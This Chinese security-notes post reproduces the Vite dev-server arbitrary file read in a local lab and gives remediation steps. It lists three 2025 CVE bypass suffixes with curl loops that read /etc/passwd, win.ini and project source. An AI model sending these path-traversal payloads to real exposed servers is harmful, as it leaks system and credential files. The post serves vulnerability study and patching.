---
title: "Vite 开发服务任意文件读取"
slug: "vite-arbitrary-file-read"
date: 2026-09-02T17:38:53+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "从版本指纹到 CVE 检索，复现 Vite 开发服务的任意文件读取。"
summary: "从版本指纹到 CVE 检索，复现 Vite 开发服务的任意文件读取。"
tags: ["Vite", "CVE", "文件读取"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 11
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/19.Vite开发服务类型.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/vite-arbitrary-file-read/workflow.svg" alt="开发服务器的文件服务接口未正确限制根目录，导致路径穿越读取敏感文件。" loading="lazy">
  <figcaption>图 1 · Vite 任意文件读取。开发服务器的文件服务接口未正确限制根目录，导致路径穿越读取敏感文件。</figcaption>
</figure>

## 1. 受影响版本与本地环境

2025 年 Vite 开发服务器的 `@fs` 文件读取限制存在多组绕过。复现前先确定版本：

```bash
curl -sS 'http://127.0.0.1:5173/package.json'
curl -sS 'http://127.0.0.1:5173/@vite/client' -o /tmp/vite-client.js
```

建立本地测试项目：

```bash
mkdir -p /tmp/vite-lab
cd /tmp/vite-lab
npm init -y
npm install vite@6.2.0
cat > index.html <<'HTML'
<div id="app">vite test</div>
<script type="module" src="/src/main.js"></script>
HTML
mkdir -p src
echo 'console.log("vite")' > src/main.js
npx vite --host 127.0.0.1
```

## 2. 探测 `@fs`

```bash
for url in \
  'http://127.0.0.1:5173/@fs//etc/passwd' \
  'http://127.0.0.1:5173/@fs/etc/passwd'; do
  echo "== $url"
  curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' "$url"
done
```

403 通常表示 allow-list 拦截，说明 `@fs` 路径存在；需要继续测 query 变体。

## 3. 2025 年三个常见 CVE 变体

| CVE | 绕过形式 |
| --- | --- |
| CVE-2025-30208 | `?raw??` |
| CVE-2025-31125 | `?raw&import` |
| CVE-2025-31486 | `?import&raw` |

完整循环：

```bash
for suffix in \
  '?raw??' \
  '?raw&import' \
  '?import&raw' \
  '?raw' \
  '?import&raw??'; do
  url="http://127.0.0.1:5173/@fs//etc/passwd${suffix}"
  echo "== $url"
  curl -sS -w '\n[%{http_code}]\n' "$url"
done
```

如果某个响应包含 `/etc/passwd` 内容，说明版本可绕。

## 4. 读取项目外文件

Linux：

```bash
curl -sS 'http://127.0.0.1:5173/@fs//etc/passwd?raw??'
```

Windows：

```bash
curl -sS 'http://127.0.0.1:5173/@fs/C:/Windows/win.ini?raw??'
```

读取项目源码：

```bash
curl -sS 'http://127.0.0.1:5173/src/main.js'
curl -sS 'http://127.0.0.1:5173/@fs//tmp/vite-lab/src/main.js?raw??'
```

## 5. 版本确认与官方修复

确认 `node_modules/vite/package.json` 的 `version` 字段，再查 GitHub Advisory Database、
NVD 和 Vite 官方安全公告。不要只看博客里的版本号。

修复：

```bash
npm install vite@latest
npm audit fix
```

开发服务器不要暴露公网：

```bash
npx vite --host 127.0.0.1
```

## 6. 排错

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| `@fs` 404 | 路径没有映射 | 先访问 `/@vite/client` |
| 全部 403 | 新版本已修复 | 换目标版本，不要硬打 |
| 读到源码但无敏感数据 | 路径不对 | 先读 `/etc/passwd` 或项目外文件 |
| 浏览器自动规范化 URL | 浏览器改了 `../` | 用 curl 或 Burp 直接发 |

## 7. 修复

- 升级 Vite；
- 开发服务仅绑定 loopback；
- 不在生产环境暴露开发服务器；
- 使用反向代理限制 `@fs`；
- 最小化项目目录权限。
